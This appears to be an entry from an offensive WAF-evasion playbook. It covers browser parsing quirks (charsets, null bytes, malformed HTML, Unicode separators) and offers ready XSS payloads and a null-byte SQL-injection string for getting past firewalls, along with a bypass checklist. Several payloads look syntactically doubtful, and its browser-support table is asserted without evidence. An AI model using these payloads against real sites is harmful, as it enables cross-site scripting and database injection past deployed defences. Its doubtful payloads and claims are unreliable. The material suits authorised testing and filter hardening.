---
id: WAF-EVASION-15
title: Browser Bugs (Charset, Null Bytes, Parsing)
category: Evasion Techniques
severity_range: Medium-Critical
owasp_ref: https://github.com/0xInfection/Awesome-WAF
---

# WAF-EVASION-15: Browser Bugs (Charset, Null Bytes, Parsing)

## Summary

Exploiting differences between how WAFs and browsers parse content. These techniques leverage browser-specific quirks in charset handling, null byte interpretation, and HTML parsing to deliver payloads that WAFs miss but browsers execute.

## When to Use

- When standard encoded payloads are blocked
- Against WAFs with strict content-type validation
- When the application accepts non-standard character sets
- For XSS payloads that need to bypass server-side filters

## Charset Bugs

Browsers interpret content based on declared or detected character sets. If a WAF normalizes to UTF-8 but the browser uses a different charset, payloads can be hidden.

```html
<!-- UTF-32 encoded XSS (IE vulnerability) -->
<meta charset="UTF-32">
<script>alert(1)</script>

<!-- The WAF sees UTF-8 bytes; IE interprets as UTF-32 -->
```

## Null Byte Injection

Null bytes (`%00`) can terminate strings in WAF rule engines but are ignored or handled differently by browsers.

```html
<!-- Null byte in unexpected position -->
<scri%00pt>alert(1)</scri%00pt>

<!-- Null byte truncation in SQLi -->
1' UNION SELECT 1,2,3-- %00
```

## HTML Parsing Bugs

Browsers are forgiving with malformed HTML; WAF parsers often are not.

```html
<!-- Special character confusion -->
<svg% o% nload=alert(1)>

<!-- Double slash confusion -->
<//script>alert(1)<///script>

<!-- Exclamation mark injection -->
<!<script>alert(1)</script>

<!-- Question mark confusion -->
<?script>alert(1)</?script>
```

## Unicode Separators

Different browsers handle Unicode whitespace and separator characters differently:

| Browser | Unicode Separator Support |
|---------|--------------------------|
| Internet Explorer | U+200B (zero-width space), U+200C, U+FEFF |
| Chrome | U+200B, U+200C, U+200D, U+FEFF |
| Safari | U+200B, U+200C, U+FEFF |
| Firefox | U+200B, U+200C, U+200D, U+FEFF |
| Opera | U+200B, U+200C, U+FEFF |
| Android | U+200B, U+200C |

```html
<!-- Zero-width space between keywords -->
<scr&#x200B;ipt>alert(1)</scr&#x200B;ipt>
```

## Common Root Causes

- WAFs and browsers use different HTML parsers with different error tolerance
- Charset negotiation differences between WAF and browser
- Null byte handling varies significantly across systems
- Browsers are designed to render broken HTML; WAF parsers are strict
- Unicode separator handling is inconsistent across implementations

## Bypass Techniques

- Test with different declared charsets (UTF-7, UTF-32, ISO-2022-JP)
- Inject null bytes at different positions in payloads
- Exploit HTML parsing differences (redundant tags, broken syntax)
- Use Unicode separators that browsers accept but WAFs filter

## Gate 0 Validation

- [ ] Have I tested different charset declarations?
- [ ] Have I tried null byte injection?
- [ ] Have I tested HTML parsing quirks (double slashes, broken tags)?
- [ ] Have I tested browser-specific Unicode separators?
